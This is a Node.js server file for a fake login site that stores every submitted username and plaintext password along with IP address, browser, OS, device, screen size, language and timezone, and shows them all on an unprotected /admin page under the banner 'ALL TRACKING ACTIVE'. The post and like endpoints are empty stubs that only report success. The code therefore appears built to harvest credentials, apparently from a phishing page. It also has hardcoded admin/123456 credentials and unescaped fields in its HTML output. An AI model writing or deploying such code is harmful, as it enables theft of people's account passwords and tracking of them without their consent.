const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 4000;

// Store ALL login attempts with FULL details
let loginLogs = [];

// Function to get detailed user info from request
function getUserDetails(req, bodyData) {
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    
    // Parse Browser and OS from User-Agent
    let browser = 'Unknown';
    let os = 'Unknown';
    let device = 'Unknown';
    
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'Mac';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
    
    if (userAgent.includes('Mobile')) device = 'Mobile';
    else if (userAgent.includes('Tablet')) device = 'Tablet';
    else device = 'Desktop';
    
    // Get screen resolution from body (sent from frontend)
    let screenResolution = bodyData.screenResolution || 'Unknown';
    let language = bodyData.language || 'Unknown';
    let timezone = bodyData.timezone || 'Unknown';
    
    return {
        ip: ip,
        browser: browser,
        os: os,
        device: device,
        screenResolution: screenResolution,
        language: language,
        timezone: timezone,
        userAgent: userAgent
    };
}

const server = http.createServer((req, res) => {
    console.log('👉', req.method, req.url);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Serve frontend
    if (req.url === '/' && req.method === 'GET') {
        fs.readFile(path.join(__dirname, '../frontend/index.html'), (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('index.html not found');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(data);
            }
        });
    }
    
    // LOGIN API - Capture ALL user data
    else if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            let data = JSON.parse(body);
            
            // Get detailed user info
            const userDetails = getUserDetails(req, data);
            
            // Save everything
            loginLogs.push({
                id: Date.now(),
                username: data.username,
                password: data.password,
                time: new Date().toLocaleString(),
                ip: userDetails.ip,
                browser: userDetails.browser,
                os: userDetails.os,
                device: userDetails.device,
                screenResolution: userDetails.screenResolution,
                language: userDetails.language,
                timezone: userDetails.timezone,
                userAgent: userDetails.userAgent,
                attemptNumber: loginLogs.filter(l => l.username === data.username).length + 1
            });
            
            console.log('💾 Login saved:', data.username, 'from', userDetails.ip, userDetails.device);
            
            if (data.username === 'admin' && data.password === '123456') {
                res.end(JSON.stringify({ success: true }));
            } else {
                res.end(JSON.stringify({ success: false }));
            }
        });
    }
    
    // Get posts
    else if (req.url === '/api/posts' && req.method === 'GET') {
        res.end(JSON.stringify([]));
    }
    
    // Create post
    else if (req.url === '/api/posts' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            res.end(JSON.stringify({ success: true }));
        });
    }
    
    // Delete post
    else if (req.url.match(/\/api\/posts\/(.+)/) && req.method === 'DELETE') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // Like post
    else if (req.url.match(/\/api\/posts\/(.+)\/like/) && req.method === 'POST') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // ADMIN PANEL - Show ALL tracked data
    else if (req.url === '/admin') {
        let logsHtml = '';
        for (let log of loginLogs.slice().reverse()) {
            logsHtml += `
                <tr>
                    <td>${log.id}</td>
                    <td><strong>${escapeHtml(log.username)}</strong></td>
                    <td><strong style="color:#ff6b6b;">${escapeHtml(log.password)}</strong></td>
                    <td>${log.time}</td>
                    <td>${log.ip}</td>
                    <td>${log.browser}</td>
                    <td>${log.os}</td>
                    <td>${log.device}</td>
                    <td>${log.screenResolution}</td>
                    <td>${log.language}</td>
                    <td>${log.timezone}</td>
                    <td>${log.attemptNumber}</td>
                </tr>
            `;
        }
        
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Panel - Complete Tracking</title>
                <style>
                    body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
                    h1 { color: #1877f2; text-align: center; }
                    h2 { color: #00ff88; margin-top: 30px; }
                    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
                    .stat-card { background: #1a1f3e; padding: 15px; border-radius: 10px; text-align: center; }
                    .stat-number { font-size: 32px; font-weight: bold; color: #00ff88; }
                    .stat-label { font-size: 12px; color: #888; margin-top: 5px; }
                    table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                    th { background: #1877f2; color: white; position: sticky; top: 0; }
                    tr:hover { background: #2a2f4e; }
                    .finger { font-size: 50px; text-align: center; margin: 20px; }
                    .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 20px 0; }
                    .summary { background: #1a1f3e; padding: 15px; border-radius: 10px; margin: 20px 0; }
                    .warning { color: #ff6b6b; }
                </style>
            </head>
            <body>
                <h1>🔧 ADMIN PANEL - COMPLETE USER TRACKING 🔧</h1>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${loginLogs.length}</div>
                        <div class="stat-label">Total Login Attempts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div>
                        <div class="stat-label">Successful Logins</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${loginLogs.filter(l => l.username !== 'admin' || l.password !== '123456').length}</div>
                        <div class="stat-label">Failed Attempts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${[...new Set(loginLogs.map(l => l.ip))].length}</div>
                        <div class="stat-label">Unique IP Addresses</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${[...new Set(loginLogs.map(l => l.browser))].length}</div>
                        <div class="stat-label">Browsers Used</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">${[...new Set(loginLogs.map(l => l.os))].length}</div>
                        <div class="stat-label">OS Used</div>
                    </div>
                </div>
                
                <div class="summary">
                    <h3>📊 Summary</h3>
                    <p>🔹 Most used browser: ${getMostUsed(loginLogs.map(l => l.browser))}</p>
                    <p>🔹 Most used OS: ${getMostUsed(loginLogs.map(l => l.os))}</p>
                    <p>🔹 Most common device: ${getMostUsed(loginLogs.map(l => l.device))}</p>
                </div>
                
                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh Data</button>
                
                <h2>📋 ALL LOGIN ATTEMPTS WITH COMPLETE DETAILS</h2>
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>USERNAME</th>
                                <th>PASSWORD</th>
                                <th>TIME</th>
                                <th>IP ADDRESS</th>
                                <th>BROWSER</th>
                                <th>OS</th>
                                <th>DEVICE</th>
                                <th>SCREEN</th>
                                <th>LANGUAGE</th>
                                <th>TIMEZONE</th>
                                <th>ATTEMPT #</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${logsHtml || '<tr><td colspan="12" style="text-align:center;">No login attempts yet</td></tr>'}
                        </tbody>
                    </table>
                </div>
                
                <div class="finger">
                    🖕 ALL TRACKING ACTIVE 🖕
                </div>
                
                <p style="text-align:center; margin-top:20px;">
                    📱 Frontend: <a href="https://${req.headers.host}" style="color:#1877f2;">https://${req.headers.host}</a><br>
                    🔑 Login: admin / 123456
                </p>
            </body>
            </html>
        `);
    }
    
    else {
        res.writeHead(404);
        res.end('404');
    }
});

function escapeHtml(text) {
    if (!text) return 'Unknown';
    return text.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

function getMostUsed(arr) {
    if (arr.length === 0) return 'N/A';
    const counts = {};
    arr.forEach(item => { counts[item] = (counts[item] || 0) + 1; });
    let max = 0;
    let mostUsed = 'Unknown';
    for (let key in counts) {
        if (counts[key] > max) {
            max = counts[key];
            mostUsed = key;
        }
    }
    return mostUsed || 'Unknown';
}

server.listen(PORT, () => {
    console.log('\n🚀 ==================================');
    console.log('   SERVER RUNNING WITH FULL TRACKING!');
    console.log('==================================');
    console.log(`📱 Frontend: http://localhost:${PORT}`);
    console.log(`🔧 Admin:    http://localhost:${PORT}/admin`);
    console.log('🔑 Login: admin / 123456\n');
});